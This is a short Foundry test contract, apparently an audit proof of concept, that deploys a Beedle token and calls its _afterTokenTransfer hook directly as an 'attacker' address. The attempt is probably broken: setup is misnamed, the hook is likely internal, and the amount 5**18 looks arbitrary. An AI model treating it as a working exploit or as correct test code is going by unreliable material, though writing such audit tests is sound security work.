pragma solidity ^0.8.19;

import {Beedle} from "../src/Beedle.sol";
import "forge-std/Test.sol";

contract BeedleAttacker is Test{
    Beedle beedle;
    address attacker = address(1);

    function setup() public {
      beedle = new Beedle() ; 
      beedle.transfer(attacker, 10**18);
    }

    function afterTokenTransferAttack() external {
        vm.startPrank(attacker);
        beedle._afterTokenTransfer(attacker, address(2), 5**18);
    } 
}
